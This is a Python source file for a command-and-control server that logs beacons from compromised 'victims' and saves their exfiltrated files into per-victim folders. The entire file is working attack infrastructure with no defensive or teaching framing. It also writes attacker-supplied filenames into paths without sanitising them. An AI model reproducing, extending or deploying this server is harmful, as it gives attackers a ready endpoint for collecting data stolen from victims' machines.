"""
Simple C2 Server - Just receives files
No web interface, runs in background
"""

import socket
import json
import sqlite3
from pathlib import Path
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import logging
import os

os.environ['PYTHONIOENCODING'] = 'utf-8'

# ================== CONFIG ==================
class C2Config:
    def __init__(self):
        self.C2_HOST = '0.0.0.0'
        self.C2_PORT = 9443
        
        self.DATA_DIR = Path("c2_received_data")
        self.DATA_DIR.mkdir(exist_ok=True)
        
        self.EXFIL_DIR = self.DATA_DIR / "exfiltrated_files"
        self.EXFIL_DIR.mkdir(exist_ok=True)
        
        self.LOG_FILE = self.DATA_DIR / "c2_server.log"

CONFIG = C2Config()

# ================== LOGGING ==================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(CONFIG.LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ================== C2 SERVER ==================
class SimpleC2Handler(BaseHTTPRequestHandler):
    
    def do_POST(self):
        """Handle POST requests from victims"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length)
            
            path = self.path
            
            if path == '/api/beacon':
                self.handle_beacon(body)
            elif path == '/api/exfil':
                self.handle_exfil(body)
            else:
                self.send_response(404)
                self.end_headers()
        
        except Exception as e:
            logger.error(f"Error: {e}")
            try:
                self.send_response(500)
                self.end_headers()
            except:
                pass
    
    def handle_beacon(self, body):
        """Handle beacon/heartbeat from victim"""
        try:
            data = json.loads(body.decode())
            victim_id = data.get('victim_id', 'unknown')
            hostname = data.get('hostname', 'unknown')
            
            logger.info(f"[+] BEACON from {victim_id} ({hostname})")
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'ok'}).encode())
        
        except Exception as e:
            logger.error(f"Beacon error: {e}")
            self.send_response(400)
            self.end_headers()
    
    def handle_exfil(self, body):
        """Handle exfiltrated file"""
        try:
            # Get victim ID from header
            victim_id = self.headers.get('X-Victim-ID', 'unknown')
            
            # Get metadata from header
            metadata_str = self.headers.get('X-Metadata', '{}')
            try:
                metadata = json.loads(metadata_str)
            except:
                metadata = {}
            
            filename = metadata.get('filename', 'unknown_file')
            file_size = metadata.get('size', len(body))
            
            # Create victim folder
            victim_folder = CONFIG.EXFIL_DIR / victim_id
            victim_folder.mkdir(exist_ok=True)
            
            # Save file
            file_path = victim_folder / filename
            with open(file_path, 'wb') as f:
                f.write(body)
            
            size_mb = file_size / (1024 * 1024)
            logger.info(f"[+] RECEIVED: {filename} ({size_mb:.2f} MB) from {victim_id}")
            logger.info(f"    -> Saved to: {file_path}")
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'received'}).encode())
        
        except Exception as e:
            logger.error(f"Exfil error: {e}")
            try:
                self.send_response(400)
                self.end_headers()
            except:
                pass
    
    def log_message(self, format, *args):
        pass  # Suppress default HTTP logging

# ================== MAIN ==================
def main():
    print("""
    ╔════════════════════════════════════════════════════════════════╗
    ║              SIMPLE C2 SERVER (BACKGROUND)                     ║
    ║                  No Web UI - Files Only                        ║
    ╚════════════════════════════════════════════════════════════════╝
    """)
    
    logger.info("=" * 60)
    logger.info(f"C2 Server listening on 0.0.0.0:{CONFIG.C2_PORT}")
    logger.info(f"Saving files to: {CONFIG.EXFIL_DIR}")
    logger.info("Waiting for connections...")
    logger.info("=" * 60)
    
    server = HTTPServer((CONFIG.C2_HOST, CONFIG.C2_PORT), SimpleC2Handler)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Shutting down...")

if __name__ == "__main__":
    main()
